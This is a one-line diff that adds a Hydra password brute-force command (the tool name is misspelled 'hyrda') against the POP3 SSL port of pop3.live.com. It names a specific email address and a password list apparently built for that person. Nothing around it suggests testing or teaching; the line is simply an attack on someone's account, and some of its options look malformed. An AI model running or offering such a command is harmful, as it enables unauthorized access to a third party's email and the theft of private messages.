@@ -1,0 +1,2 @@
+hyrda -S -l lee2822@live.com -P /passwords/leepass.txt -e en -V -s 995 pop3.live.com pop3
+
